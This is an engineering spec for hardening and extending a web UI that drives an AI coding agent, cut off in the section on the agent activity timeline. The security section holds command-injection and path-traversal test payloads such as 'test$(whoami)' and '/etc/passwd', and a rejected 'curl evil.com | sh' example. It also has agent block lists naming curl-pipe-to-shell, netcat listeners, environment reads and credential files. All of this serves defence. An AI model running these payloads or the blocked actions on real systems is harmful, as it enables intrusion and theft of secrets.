# Vibe-UI Enhancement Specs

Comprehensive spec for fixes, enhancements, and features — designed for autonomous execution via Claude Loop.

---

## Phase 1: Security Hardening

### 1.1 Sanitize Shell Command Inputs

**Problem:** Branch names from `req.body.branch` are interpolated directly into `execSync()` template strings with no validation. A malicious branch name like `"; rm -rf / #` executes arbitrary commands.

**Files:**
- `server-washmen.js` lines 300, 305-306, 331, 333, 389, 394
- `server/ws-handler-washmen.js` line 320

**Implementation:**

1. Create a shared `sanitize.js` module in `server/`:

```javascript
// server/sanitize.js
export function sanitizeBranchName(name) {
  // Only allow alphanumeric, hyphens, underscores, forward slashes
  if (!/^[a-zA-Z0-9\-_\/]+$/.test(name)) {
    throw new Error(`Invalid branch name: "${name}"`);
  }
  return name;
}

export function sanitizePort(port) {
  const p = parseInt(port, 10);
  if (isNaN(p) || p < 1 || p > 65535) {
    throw new Error(`Invalid port: "${port}"`);
  }
  return p;
}
```

2. In `server-washmen.js`, validate at the entry point of each endpoint:
   - `POST /api/switch-branch`: validate `req.body.branch` with `sanitizeBranchName()` before any `execSync`
   - `POST /api/create-branch`: the slug is already sanitized, but add the regex check after slugification
   - Service restart: validate `cfgRepo.port` with `sanitizePort()` before use in `lsof` command

3. In `server/ws-handler-washmen.js` line 320: validate the branch read from `git rev-parse` output before using it.

4. For `workspace.json` dev commands: validate against an allowlist of known safe patterns:
```javascript
const ALLOWED_DEV_PATTERNS = [
  /^(npm|yarn|pnpm)\s+(run\s+)?(dev|start|serve)$/,
  /^node\s+[\w\-\.\/]+\.js$/,
  /^npx\s+[\w\-@\/]+$/,
];
```
Reject any `cfgRepo.dev` that doesn't match.

**Acceptance Criteria:**
- [ ] `server/sanitize.js` exists with `sanitizeBranchName()` and `sanitizePort()` exports
- [ ] `POST /api/switch-branch` with `{ branch: "test$(whoami)" }` returns 400
- [ ] `POST /api/switch-branch` with `{ branch: "mvp/valid-name" }` succeeds
- [ ] `POST /api/create-branch` with `{ name: "hello; rm -rf /" }` creates a safe slug, no shell execution
- [ ] Port injection `cfgRepo.port = "3000; whoami"` is rejected
- [ ] `workspace.json` dev command `"npm run dev"` passes validation
- [ ] `workspace.json` dev command `"curl evil.com | sh"` is rejected
- [ ] All `execSync` calls in `server-washmen.js` use sanitized inputs (audit all occurrences)

**Test Script:**
```bash
# Run from within the Codespace after implementation
# Test 1: Malicious branch name rejected
curl -s -X POST http://localhost:4000/api/switch-branch \
  -H "Content-Type: application/json" \
  -d '{"branch":"test$(whoami)"}' | grep -q "Invalid branch" && echo "PASS: injection blocked" || echo "FAIL"

# Test 2: Valid branch name accepted
curl -s -X POST http://localhost:4000/api/switch-branch \
  -H "Content-Type: application/json" \
  -d '{"branch":"mvp/my-feature"}' | grep -q '"ok"' && echo "PASS: valid branch works" || echo "FAIL"

# Test 3: Branch with backticks rejected
curl -s -X POST http://localhost:4000/api/switch-branch \
  -H "Content-Type: application/json" \
  -d '{"branch":"mvp/\`whoami\`"}' | grep -q "Invalid branch" && echo "PASS: backticks blocked" || echo "FAIL"

# Test 4: Branch with semicolons rejected
curl -s -X POST http://localhost:4000/api/switch-branch \
  -H "Content-Type: application/json" \
  -d '{"branch":"test; echo pwned"}' | grep -q "Invalid branch" && echo "PASS: semicolons blocked" || echo "FAIL"
```

---

### 1.2 Restrict `/api/file` to Workspace

**Problem:** The `/api/file` endpoint at `server-washmen.js:425-436` accepts absolute paths, allowing reads of `/etc/passwd`, `.env`, API keys.

**File:** `server-washmen.js` lines 425-436

**Implementation:**

Replace the current handler with path traversal protection (matching the pattern already used in `server/routes/files.js:49-50`):

```javascript
app.get("/api/file", (req, res) => {
  try {
    const filePath = req.query.path;
    if (!filePath) return res.status(400).json({ error: "Missing path" });
    const workspaceDir = getWorkspaceDir();
    const resolved = resolve(workspaceDir, filePath);
    // Block path traversal and absolute paths outside workspace
    if (!resolved.startsWith(resolve(workspaceDir) + sep)) {
      return res.status(403).json({ error: "Access denied: path outside workspace" });
    }
    const content = readFileSync(resolved, "utf8");
    res.json({ path: filePath, content });
  } catch (err) {
    res.status(404).json({ error: err.message });
  }
});
```

Import `resolve` and `sep` from `path` (already imported as `join`).

**Acceptance Criteria:**
- [ ] `GET /api/file?path=/etc/passwd` returns 403 "Access denied"
- [ ] `GET /api/file?path=../../etc/passwd` returns 403 "Access denied"
- [ ] `GET /api/file?path=package.json` returns the file content (within workspace)
- [ ] `GET /api/file?path=server-washmen.js` returns the file content
- [ ] No absolute paths outside workspace are readable

**Test Script:**
```bash
# Test 1: Absolute path outside workspace blocked
curl -s "http://localhost:4000/api/file?path=/etc/passwd" | grep -q "Access denied" && echo "PASS" || echo "FAIL"

# Test 2: Traversal blocked
curl -s "http://localhost:4000/api/file?path=../../../etc/passwd" | grep -q "Access denied" && echo "PASS" || echo "FAIL"

# Test 3: Workspace file works
curl -s "http://localhost:4000/api/file?path=package.json" | grep -q '"content"' && echo "PASS" || echo "FAIL"
```

---

### 1.3 Add Auth Token to WebSocket and API

**Problem:** No authentication on WebSocket or HTTP endpoints. Any client can connect and use the API.

**Files:**
- `server-washmen.js` lines 21, 1009-1011
- All `app.get/post` route handlers

**Implementation:**

1. Generate a random auth token on server start and expose it via an env var or embed in the HTML page:

```javascript
// server-washmen.js (near top)
const AUTH_TOKEN = process.env.VIBE_AUTH_TOKEN || crypto.randomUUID();
console.log(`[auth] Token: ${AUTH_TOKEN}`);
```

2. Embed token in the served HTML (render it server-side):
```javascript
app.get("/", (_req, res) => {
  let html = readFileSync(join(__dirname, "public", "index-v2.html"), "utf8");
  html = html.replace("</head>", `<script>window.__VIBE_TOKEN="${AUTH_TOKEN}";</script></head>`);
  res.send(html);
});
```

3. Validate on WebSocket connection:
```javascript
wss.on("connection", (ws, req) => {
  const url = new URL(req.url, `http://${req.headers.host}`);
  const token = url.searchParams.get("token");
  if (token !== AUTH_TOKEN) {
    ws.close(4001, "Unauthorized");
    return;
  }
  handleWashmenWs(ws, sessionIds);
});
```

4. Client sends token on connect (`public/app.js` connect function):
```javascript
ws = new WebSocket(`${proto}//${location.host}/ws?token=${window.__VIBE_TOKEN}`);
```

5. Add middleware for HTTP API routes:
```javascript
function requireAuth(req, res, next) {
  const token = req.headers["x-vibe-token"] || req.query.token;
  if (token !== AUTH_TOKEN) return res.status(401).json({ error: "Unauthorized" });
  next();
}
// Apply to all /api/* routes
app.use("/api", requireAuth);
```

**Acceptance Criteria:**
- [ ] Server logs auth token on startup
- [ ] HTML page includes `window.__VIBE_TOKEN` in a script tag
- [ ] WebSocket connection without `?token=` param is rejected with code 4001
- [ ] WebSocket connection with valid token succeeds
- [ ] `GET /api/workspace` without token returns 401
- [ ] `GET /api/workspace` with `X-Vibe-Token` header succeeds
- [ ] Browser UI works end-to-end (token auto-sent from embedded script)

**Test Script:**
```bash
# Test 1: API without token returns 401
curl -s -o /dev/null -w "%{http_code}" http://localhost:4000/api/workspace
# Expected: 401

# Test 2: API with token returns 200
TOKEN=$(curl -s http://localhost:4000 | grep -oP '__VIBE_TOKEN="([^"]+)"' | cut -d'"' -f2)
curl -s -o /dev/null -w "%{http_code}" -H "X-Vibe-Token: $TOKEN" http://localhost:4000/api/workspace
# Expected: 200

# Test 3: WebSocket without token (use wscat)
# wscat -c ws://localhost:4000/ws → should disconnect immediately
# wscat -c "ws://localhost:4000/ws?token=$TOKEN" → should connect
```

---

### 1.4 Harden `/api/exec` Endpoint

**Problem:** `server/routes/exec.js` accepts arbitrary shell commands with no whitelist.

**File:** `server/routes/exec.js` lines 7-35

**Implementation:**

Add a command whitelist. Only allow commands needed by the UI:

```javascript
const ALLOWED_COMMANDS = [
  /^git\s+(status|log|diff|branch|show)/,
  /^ls\b/,
  /^cat\b/,
  /^head\b/,
  /^tail\b/,
  /^wc\b/,
  /^find\b/,
  /^grep\b/,
];

router.post("/", (req, res) => {
  const { command, cwd } = req.body;
  if (!command) return res.status(400).json({ error: "command is required" });

  // Whitelist check
  if (!ALLOWED_COMMANDS.some(p => p.test(command))) {
    return res.status(403).json({ error: "Command not allowed" });
  }

  // Validate cwd is within workspace
  const workspaceDir = getWorkspaceDir();
  const resolvedCwd = resolve(cwd || workspaceDir);
  if (!resolvedCwd.startsWith(resolve(workspaceDir))) {
    return res.status(403).json({ error: "cwd outside workspace" });
  }
  // ... rest of handler
});
```

**Acceptance Criteria:**
- [ ] `POST /api/exec` with `{ command: "git status" }` succeeds
- [ ] `POST /api/exec` with `{ command: "rm -rf /" }` returns 403 "Command not allowed"
- [ ] `POST /api/exec` with `{ command: "node -e 'process.exit(1)'" }` returns 403
- [ ] `POST /api/exec` with `{ cwd: "/etc" }` returns 403 "cwd outside workspace"
- [ ] `POST /api/exec` with `{ command: "ls", cwd: "/workspaces/..." }` succeeds

**Test Script:**
```bash
# Test 1: Allowed command
curl -s -X POST http://localhost:4000/api/exec \
  -H "Content-Type: application/json" \
  -d '{"command":"git status"}' | grep -q "stdout" && echo "PASS" || echo "FAIL"

# Test 2: Blocked command
curl -s -X POST http://localhost:4000/api/exec \
  -H "Content-Type: application/json" \
  -d '{"command":"rm -rf /"}' | grep -q "not allowed" && echo "PASS" || echo "FAIL"

# Test 3: CWD escape blocked
curl -s -X POST http://localhost:4000/api/exec \
  -H "Content-Type: application/json" \
  -d '{"command":"ls","cwd":"/etc"}' | grep -q "outside workspace" && echo "PASS" || echo "FAIL"
```

---

### 1.5 Strengthen Agent Guardrails

**Problem:** `BLOCKED_BASH_PATTERNS` in `ws-handler-washmen.js:52-55` is incomplete. Missing blocks for command chaining (`;`), piping (`|`), backgrounding (`&`), environment access.

**File:** `server/ws-handler-washmen.js` lines 52-96

**Implementation:**

Expand the blocked patterns:

```javascript
const BLOCKED_BASH_PATTERNS = [
  // Existing
  /migrate/i, /db:seed/i, /DROP\s/i, /DELETE\s+FROM/i, /TRUNCATE/i, /ALTER\s+TABLE/i,
  /git\s+push\s+.*\s*(master|main)\b/i,
  // New: dangerous shell patterns
  /\bsudo\b/i,
  /\brm\s+-rf?\b/i,
  /\bcurl\b.*\|\s*(sh|bash)\b/,           // curl pipe to shell
  /\bwget\b.*\|\s*(sh|bash)\b/,
  /\bchmod\b/i,
  /\bchown\b/i,
  /\bkill\b/i,
  /\bpkill\b/i,
  /\breboot\b/i,
  /\bshutdown\b/i,
  /\bnc\s+-l/i,                            // netcat listener
  /\benv\b/,                               // reading env vars
  /\bprintenv\b/,
  /\/etc\//,                               // system file access
  /\/proc\//,
  /\.env\b/,                               // dotenv files
];

const BLOCKED_FILE_PATTERNS = [
  // Existing
  /\/policies\//i, /\/middleware\//i, /\/auth\//i,
  // New: sensitive files
  /\.env$/i, /\.env\./i,
  /credentials/i,
  /secrets?\./i,
  /\.pem$/i, /\.key$/i,
  /package\.json$/i,                       // prevent dependency tampering
  /workspace\.json$/i,                     // prevent config tampering
];
```

**Acceptance Criteria:**
- [ ] `BLOCKED_BASH_PATTERNS` includes `sudo`, `rm -rf`, `curl|sh`, `chmod`, `env`, `printenv`, `/etc/`, `/proc/`, `.env`
- [ ] `BLOCKED_FILE_PATTERNS` includes `.env`, `credentials`, `secrets`, `.pem`, `.key`, `package.json`, `workspace.json`
- [ ] Agent sending `Bash` tool with command `cat .env` is blocked
- [ ] Agent sending `Bash` tool with command `sudo apt install` is blocked
- [ ] Agent sending `Edit` tool targeting `.env` file is blocked
- [ ] Agent sending `Edit` tool targeting `src/pages/Home.jsx` is allowed
- [ ] Agent sending `Bash` tool with `npm test` is allowed

**Test Steps (manual via chat):**
1. Start a build session on a feature branch
2. Ask the AI: "Read the contents of .env file using bash"
3. Verify: AI should be blocked by guardrails, user sees a "Blocked" message
4. Ask the AI: "Edit the package.json to add a new dependency"
5. Verify: AI should be blocked from editing package.json
6. Ask the AI: "Create a new React component at src/components/Test.jsx"
7. Verify: AI should be allowed to create the file

---

## Phase 2: Reliability & Performance

### 2.1 Fix Session Titles

**Problem:** Sessions are created with `text.slice(0, 50)` as the `project_name` field, but the `title` column stays `null`. The landing screen shows untitled sessions.

**Files:**
- `server/ws-handler-washmen.js` line 334
- `db.js` lines 238-240, 454

**Implementation:**

1. The `createSession` prepared statement uses `project_name` but not `title`. Update the call:

```javascript
// ws-handler-washmen.js line 334 — change:
createSession(sessionId, null, text.slice(0, 50), "", branch);
// to also update the title column afterward:
createSession(sessionId, null, text.slice(0, 50), "", branch);
db.prepare("UPDATE sessions SET title = ? WHERE id = ?").run(text.slice(0, 80), sessionId);
```

2. Display titles in the landing branch list. In `server-washmen.js` `/api/workspace` endpoint, include session title:
```javascript
session: session ? {
  id: session.id,
  messageCount: msgCount,
  lastUsedAt: session.last_used_at,
  title: session.title || session.project_name || null,
} : null,
```

3. Frontend (`public/app.js` showLanding): show session title under branch name:
```javascript
const title = b.session?.title || '';
item.innerHTML = `
  <span class="landing-branch-name">${escapeHtml(b.name)}</span>
  ${title ? `<span class="landing-branch-title">${escapeHtml(title)}</span>` : ''}
  <span class="landing-branch-meta">${meta}</span>
`;
```

4. Add CSS for `.landing-branch-title`:
```css
.landing-branch-title { font-size: 11px; color: var(--text-dim); overflow: hidden; text-overflow: ellipsis; white-space: nowrap; max-width: 200px; }
```

---

### 2.2 Per-Turn Budget Enforcement

**Problem:** Budget is checked once at query start (`ws-handler-washmen.js:282-290`). If a query runs many turns, it can exceed the $5 per-query limit without detection until after completion.

**File:** `server/ws-handler-washmen.js` lines 282-290, 354

**Implementation:**

The SDK already supports `maxBudgetUsd: PER_QUERY_BUDGET` at line 354, which enforces the per-query limit at the API level. The gap is the daily budget — it's only checked once.

Add a periodic check within the streaming loop. After each `result` event (around line 490-510):

```javascript
// After addCost() at line 506
const updatedTotal = getTotalCost();
if (updatedTotal >= DAILY_BUDGET) {
  send({ type: "system", text: `Daily budget reached ($${updatedTotal.toFixed(2)}/$${DAILY_BUDGET}). Stopping.` });
  // The SDK's maxBudgetUsd handles per-query; this catches daily accumulation
}
```

---

### 2.3 Process Management & Log Rotation

**Problem:** Services spawned with `spawn().unref()` have no error handling, no health verification, and logs grow unbounded.

**Files:**
- `server-washmen.js` lines 331-334 (spawn)
- `server-washmen.js` line 518 (logPositions)
- `server-washmen.js` line 537 (browserConsoleBuffer)

**Implementation:**

1. **Log rotation** — truncate log files before restarting:
```javascript
// Before spawn (line 332):
const logFile = `/tmp/${cfgRepo.name}.log`;
try { writeFileSync(logFile, ""); } catch {} // Truncate on restart
```

2. **Bound logPositions** — clear entries for files that no longer exist:
```javascript
// In the console-logs endpoint, add cleanup:
for (const key of Object.keys(logPositions)) {
  if (!existsSync(`/tmp/${key}`)) delete logPositions[key];
}
```

3. **Bound browserConsoleBuffer** — reduce max from 200 to 100:
```javascript
if (browserConsoleBuffer.length > 100) browserConsoleBuffer.splice(0, 50);
```

4. **Spawn error handling** — capture stderr:
```javascript
const child = spawn("bash", ["-c", `cd "${repoPath}" && ${cfgRepo.dev} >> ${logFile} 2>&1`], { detached: true, stdio: "ignore" });
child.unref();
child.on("error", (err) => {
  console.error(`[spawn] ${cfgRepo.name} failed:`, err.message);
  wsBroadcast({ type: "system", text: `Failed to start ${cfgRepo.name}: ${err.message}` });
});
```

---

### 2.4 Fix Markdown Streaming Performance

**Problem:** `appendAssistantText()` in `components/chat.js` re-parses the entire accumulated markdown on every streaming chunk (O(n^2) for a long response).

**Files:**
- `public/components/chat.js` lines 36-37
- `public/js/ui/messages.js` lines 89-108

**Implementation:**

Batch updates with `requestAnimationFrame` and throttle rendering:

```javascript
// components/chat.js — replace lines 36-37:
let renderPending = false;
export function addAgentMsg(text, streaming) {
  if (streaming && text) {
    currentAgentText += text;
    if (!renderPending) {
      renderPending = true;
      requestAnimationFrame(() => {
        currentAgentBubble.innerHTML = marked.parse(currentAgentText);
        highlightCodeBlocks(currentAgentBubble);
        addCopyButtons(currentAgentBubble);
        renderPending = false;
      });
    }
    return;
  }
  // ... finalize logic
}
```

This batches multiple chunks per animation frame (~16ms), reducing renders from potentially hundreds to ~60/second max. For a typical 2-second streaming response with 200 chunks, this reduces full re-parses from 200 to ~120.

For further optimization, only re-render the last paragraph/code block instead of the full text. But the `requestAnimationFrame` approach is the simplest win.

---

### 2.5 Fix Event Listener Leaks in Parallel Mode

**Problem:** `createChatPane()` in `js/ui/parallel.js` adds event listeners per pane but `exitParallelMode()` doesn't remove them.

**File:** `public/js/ui/parallel.js` lines 92-107 (add), 144-162 (destroy)

**Implementation:**

Use `AbortController` per pane for easy bulk cleanup:

```javascript
// In createChatPane():
const controller = new AbortController();
const signal = controller.signal;

paneSendBtn.addEventListener("click", () => sendMessage(state), { signal });
paneStopBtn.addEventListener("click", () => stopGeneration(state), { signal });
textarea.addEventListener("keydown", handleKeydown, { signal });
textarea.addEventListener("input", handleInput, { signal });

// Store controller on the pane state
state.abortController = controller;

// In exitParallelMode():
for (const pane of panes) {
  pane.abortController?.abort(); // Removes all listeners at once
}
```

---

### 2.6 Eliminate Silent Failures

**Problem:** 40+ empty `catch {}` blocks across server code swallow real errors.

**Files:** Throughout `server-washmen.js` and `server/ws-handler-washmen.js`

**Implementation:**

Add structured logging to all catch blocks. At minimum, log the error:

```javascript
// Replace: catch {}
// With:    catch (e) { console.warn('[context] operation failed:', e.message); }
```

Priority catch blocks to fix (most impactful):
- `server-washmen.js:192` — git fetch prune failure (branch listing may be stale)
- `server-washmen.js:204` — branch listing failure (landing shows no branches)
- `server-washmen.js:266` — deps check failure (lockfile changes missed)
- `ws-handler-washmen.js:305` — Claude session resume failure (context lost)

---

## Phase 3: UX Polish

### 3.1 Wire Guided Tour to index-v2.html

**Problem:** `welcome.js` and `tour.js` exist (44 + 211 lines) with a full 17-step Driver.js tour, but `index-v2.html` has no welcome overlay HTML and doesn't load these scripts.

**Files:**
- `public/index-v2.html` — add HTML + script tags
- `public/js/features/welcome.js` — already complete
- `public/js/features/tour.js` — needs element selectors updated for v2 HTML

**Implementation:**

1. Add welcome overlay HTML to `index-v2.html` before `</body>`:
```html
<!-- Welcome Overlay -->
<div id="welcome-overlay" class="hidden">
  <div class="welcome-inner">
    <div class="welcome-title">Welcome to Washmen Ops</div>
    <div class="welcome-subtitle">AI-powered workspace for building features</div>
    <div class="welcome-features">
      <div class="welcome-feature">
        <span class="welcome-feature-icon">💬</span>
        <span>Chat with AI to build features</span>
      </div>
      <div class="welcome-feature">
        <span class="welcome-feature-icon">👁</span>
        <span>Live preview of your changes</span>
      </div>
      <div class="welcome-feature">
        <span class="welcome-feature-icon">🔀</span>
        <span>Branch-based feature development</span>
      </div>
    </div>
    <div class="welcome-actions">
      <button id="welcome-get-started" class="welcome-btn-primary">Get Started</button>
      <button id="welcome-take-tour" class="welcome-btn-secondary">Take a Tour</button>
    </div>
  </div>
</div>
```

2. Add Driver.js CDN and script imports to `<head>`:
```html
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/driver.js@1.3.6/dist/driver.css">
<script src="https://cdn.jsdelivr.net/npm/driver.js@1.3.6/dist/driver.js.iife.js"></script>
```

3. Import welcome module in `app.js` (add after other imports):
```javascript
import './js/features/welcome.js';
```

4. Update tour.js step selectors to match v2 HTML elements:
   - `#home-btn` (exists in v2)
   - `#mode-toggle` (exists in v2)
   - `#model-picker` (exists in v2)
   - `#attach-btn` (exists in v2)
   - `#input` (exists in v2, was `#message-input`)
   - `#send-btn` (exists in v2)
   - Remove steps for elements that don't exist in v2 (sidebar, session list, etc.)

---

### 3.2 Add ARIA Labels & Focus Traps

**Problem:** Modals lack `role="dialog"`, no `aria-modal`, no `aria-live` on dynamic content, no focus trapping.

**Files:**
- `public/index-v2.html` — overlays at lines 98-112
- `public/js/ui/shortcuts.js` — keyboard handling

**Implementation:**

1. Add ARIA attributes to overlays in `index-v2.html`:
```html
<div class="overlay" id="overlay-status" role="dialog" aria-modal="true" aria-label="Service Status">
<div class="overlay" id="overlay-notes" role="dialog" aria-modal="true" aria-label="Branch Summary">
```

2. Add `aria-live="polite"` to the chat area for screen reader announcements:
```html
<div class="chat-area" id="chat" style="display:none" aria-live="polite" role="log">
```

3. Add focus trap utility (`public/js/utils/focus-trap.js`):
```javascript
export function trapFocus(container) {
  const focusable = container.querySelectorAll(
    'button, [href], input, select, textarea, [tabindex]:not([tabindex="-1"])'
  );
  const first = focusable[0];
  const last = focusable[focusable.length - 1];

  function handleTab(e) {
    if (e.key !== 'Tab') return;
    if (e.shiftKey && document.activeElement === first) {
      e.preventDefault();
      last.focus();
    } else if (!e.shiftKey && document.activeElement === last) {
      e.preventDefault();
      first.focus();
    }
  }

  container.addEventListener('keydown', handleTab);
  first?.focus();
  return () => container.removeEventListener('keydown', handleTab);
}
```

4. Apply focus trap when overlays open. In `app.js`, when showing an overlay:
```javascript
import { trapFocus } from './js/utils/focus-trap.js';
let releaseTrap = null;
function showOverlay(id) {
  const el = document.getElementById(id);
  el.style.display = 'flex';
  releaseTrap = trapFocus(el);
}
function hideOverlay(id) {
  document.getElementById(id).style.display = 'none';
  releaseTrap?.();
}
```

---

### 3.3 Consolidate HTML Entry Points

**Problem:** Three HTML files exist (`index.html` 1172 lines, `index-v2.html` 245 lines, `washmen.html` 475 lines). Only `index-v2.html` is actively served at `/`. The others are dead weight.

**Files:**
- `server-washmen.js` line 26: serves `index-v2.html` at `/`
- `server-washmen.js`: serves `washmen.html` at `/v1`

**Implementation:**

1. Rename `index.html` to `index-legacy.html` (preserve, don't delete)
2. Rename `washmen.html` to `washmen-legacy.html`
3. Update the `/v1` route to redirect to `/`:
```javascript
app.get("/v1", (_req, res) => res.redirect("/"));
```
4. Add a comment at the top of legacy files: `<!-- DEPRECATED: Use index-v2.html -->`

---

### 3.4 Preview Error State UI

**Problem:** When services fail to start after branch switch, the preview iframe shows a blank white screen with no error message or retry button.

**File:** `public/components/preview.js` lines 53-82

**Implementation:**

After max retries exceeded, show an error state instead of loading anyway:

```javascript
if (attempts >= maxAttempts) {
  clearRetry();
  // Show error state instead of loading a blank page
  loader.innerHTML = `
    <div class="preview-error">
      <div class="preview-error-icon">!</div>
      <div class="preview-error-title">Services not ready</div>
      <div class="preview-error-desc">Frontend service didn't respond after 30 seconds.</div>
      <button class="preview-retry-btn" onclick="window.__retryPreview?.()">Retry</button>
    </div>
  `;
  window.__retryPreview = () => {
    loader.innerHTML = '<div class="ld"></div><div class="status-lines">Retrying...</div>';
    refreshPreview();
  };
}
```

Add CSS for the error state:
```css
.preview-error { text-align: center; padding: 32px; color: var(--text-dim); }
.preview-error-icon { width: 40px; height: 40px; border-radius: 50%; background: var(--error-soft); color: var(--error); display: inline-flex; align-items: center; justify-content: center; font-weight: 700; font-size: 18px; margin-bottom: 12px; }
.preview-error-title { font-size: 14px; font-weight: 600; color: var(--text); margin-bottom: 4px; }
.preview-error-desc { font-size: 12px; margin-bottom: 16px; }
.preview-retry-btn { background: var(--accent); color: #fff; border: none; border-radius: var(--radius-pill); padding: 8px 20px; font-size: 12px; font-weight: 600; cursor: pointer; }
```

---

## Phase 4: New Features

### 4.1 Branch Summary on Landing

**Problem:** Landing cards only show branch name and last activity time. No context about what was built.

**Files:**
- `server-washmen.js` lines 186-233 (`/api/workspace` branch listing)
- `public/app.js` lines 67-89 (landing branch rendering)
- `public/styles.css` (landing card styles)

**Implementation:**

1. **Server:** Add git stats to each branch object in `/api/workspace`:

```javascript
// After line 209 in server-washmen.js, inside the branch loop:
let commitCount = 0, lastCommitMsg = '', filesChanged = 0;
try {
  commitCount = parseInt(execSync(
    `git -C "${repoPath}" rev-list --count ${sanitizeBranchName(defaultBranch)}..${sanitizeBranchName(name)}`,
    { stdio: "pipe" }
  ).toString().trim()) || 0;
} catch {}
try {
  lastCommitMsg = execSync(
    `git -C "${repoPath}" log -1 --pretty=%s ${sanitizeBranchName(name)}`,
    { stdio: "pipe" }
  ).toString().trim().slice(0, 100);
} catch {}
try {
  filesChanged = execSync(
    `git -C "${repoPath}" diff --name-only ${sanitizeBranchName(defaultBranch)}..${sanitizeBranchName(name)}`,
    { stdio: "pipe" }
  ).toString().trim().split("\n").filter(Boolean).length;
} catch {}

branches.push({
  name,
  local: true,
  lastActivity: ts ? new Date(parseInt(ts) * 1000).toISOString() : null,
  session: session ? { ... } : null,
  commitCount,
  lastCommitMsg,
  filesChanged,
});
```

2. **Frontend:** Render branch stats in landing cards:

```javascript
// public/app.js — inside the branch list rendering loop:
const stats = [];
if (b.commitCount) stats.push(`${b.commitCount} commit${b.commitCount > 1 ? 's' : ''}`);
if (b.filesChanged) stats.push(`${b.filesChanged} file${b.filesChanged > 1 ? 's' : ''}`);
const statsHtml = stats.length ? `<span class="landing-branch-stats">${stats.join(' · ')}</span>` : '';
const titleHtml = b.lastCommitMsg ? `<span class="landing-branch-commit">${escapeHtml(b.lastCommitMsg)}</span>` : '';

item.innerHTML = `
  <div class="landing-branch-info">
    <span class="landing-branch-name">${escapeHtml(b.name)}</span>
    ${titleHtml}
  </div>
  <div class="landing-branch-right">
    ${statsHtml}
    <span class="landing-branch-meta">${meta}</span>
  </div>
`;
```

3. **CSS:**
```css
.landing-branch-info { display: flex; flex-direction: column; gap: 2px; min-width: 0; }
.landing-branch-right { display: flex; flex-direction: column; align-items: flex-end; gap: 2px; flex-shrink: 0; }
.landing-branch-commit { font-size: 11px; color: var(--text-dim); overflow: hidden; text-overflow: ellipsis; white-space: nowrap; max-width: 220px; }
.landing-branch-stats { font-size: 10px; color: var(--text-muted); white-space: nowrap; }
```

---

### 4.2 Cost Breakdown Per Branch

**Problem:** Budget is shown globally but there's no visibility into how much each feature branch has cost.

**Files:**
- `db.js` — add new prepared statement
- `server-washmen.js` — add to `/api/workspace` response
- `public/app.js` — display in landing footer or branch cards

**Implementation:**

1. **Database:** Add prepared statement in `db.js`:

```javascript
getBranchCosts: db.prepare(`
  SELECT s.branch, COALESCE(SUM(c.cost_usd), 0) AS total_cost
  FROM costs c
  JOIN sessions s ON c.session_id = s.id
  WHERE s.branch IS NOT NULL
  GROUP BY s.branch
`),
```

Export a function:
```javascript
export function getBranchCosts() {
  return stmts.getBranchCosts.all();
}
```

2. **Server:** In `/api/workspace`, merge cost data into branch objects:

```javascript
const branchCosts = {};
try {
  for (const row of getBranchCosts()) {
    branchCosts[row.branch] = row.total_cost;
  }
} catch {}

// Inside the branch loop:
branches.push({
  ...existingFields,
  cost: branchCosts[name] || 0,
});
```

3. **Frontend:** Show cost in branch cards:

```javascript
const costHtml = b.cost > 0 ? `<span class="landing-branch-cost">$${b.cost.toFixed(2)}</span>` : '';
```

CSS:
```css
.landing-branch-cost { font-size: 10px; color: var(--accent); font-weight: 500; font-family: var(--mono); }
```

---

### 4.3 Collaborative Awareness

**Problem:** No way to know which Codespace or user is working on a branch.

**Files:**
- `db.js` — add `codespace_id` column to sessions
- `server/ws-handler-washmen.js` — capture env vars at session creation
- `server-washmen.js` — include in `/api/workspace` response

**Implementation:**

1. **Database migration** in `db.js`:
```javascript
try { db.exec(`ALTER TABLE sessions ADD COLUMN codespace_id TEXT DEFAULT NULL`); } catch {}
```

2. **Update createSession** in `db.js`:
```javascript
createSession: db.prepare(
  `INSERT OR IGNORE INTO sessions (id, claude_session_id, project_name, project_path, branch, codespace_id)
   VALUES (?, ?, ?, ?, ?, ?)`
),
```

Update the export function:
```javascript
export function createSession(id, claudeSessionId, projectName, projectPath, branch = null, codespaceId = null) {
  stmts.createSession.run(id, claudeSessionId, projectName, projectPath, branch, codespaceId);
}
```

3. **Capture Codespace identity** in `ws-handler-washmen.js`:
```javascript
const codespaceId = process.env.CODESPACE_NAME || require("os").hostname();
// At line 334:
createSession(sessionId, null, text.slice(0, 50), "", branch, codespaceId);
```

4. **Include in `/api/workspace`** response per branch:
```javascript
session: session ? {
  ...existingFields,
  codespace: session.codespace_id || null,
} : null,
```

5. **Frontend:** Show Codespace badge on branch cards:
```javascript
const codespaceHtml = b.session?.codespace
  ? `<span class="landing-branch-codespace">${escapeHtml(b.session.codespace)}</span>`
  : '';
```

---

### 4.4 Auto-Generate Branch Notes on Switch

**Problem:** Branch notes exist (`branch_notes` table, manual Generate button) but aren't auto-generated when switching away from a branch.

**Files:**
- `server-washmen.js` lines 255-370 (`/api/switch-branch`)
- `server/ws-handler-washmen.js` lines 194-241 (notes generation via Claude)

**Implementation:**

Before switching branches, auto-generate notes for the current branch:

```javascript
// In /api/switch-branch, before the checkout loop (after line 278):
// Auto-save notes for the branch we're leaving
try {
  const currentBranchFile = join(workspaceDir, ".active-branch");
  const leavingBranch = existsSync(currentBranchFile) ? readFileSync(currentBranchFile, "utf-8").trim() : null;
  if (leavingBranch && leavingBranch !== branch && leavingBranch.startsWith("mvp/")) {
    wsBroadcast({ type: 'switch_progress', phase: 'step', stepId: 'save-notes', status: 'active' });
    // Get git summary for the branch
    const repoPath = join(workspaceDir, configRepos[0]?.name);
    const diffStat = execSync(`git -C "${repoPath}" diff main..HEAD --stat 2>/dev/null`, { stdio: "pipe", timeout: 5000 }).toString().trim();
    const logSummary = execSync(`git -C "${repoPath}" log main..HEAD --oneline 2>/dev/null`, { stdio: "pipe", timeout: 5000 }).toString().trim();
    if (diffStat || logSummary) {
      const notes = `## Auto-generated summary\n\n### Commits\n${logSummary || 'None'}\n\n### Changes\n${diffStat || 'None'}`;
      saveNotes(leavingBranch, notes);
    }
    wsBroadcast({ type: 'switch_progress', phase: 'step', stepId: 'save-notes', status: 'done' });
  }
} catch (e) {
  console.warn('[switch] Auto-notes failed:', e.message);
}
```

Add the "save-notes" step to the progress steps array:
```javascript
steps.unshift({ id: 'save-notes', label: 'Saving branch notes' });
```

---

### 4.5 Agent Activity Timeline

**Problem:** Tool activity is shown live during streaming but lost after the response completes. No persistent timeline for review.

**Files:**
- `server/ws-handler-washmen.js` — tool hooks
- `db.js` — new table
- `public/components/chat.js` — rendering

**Implementation:**
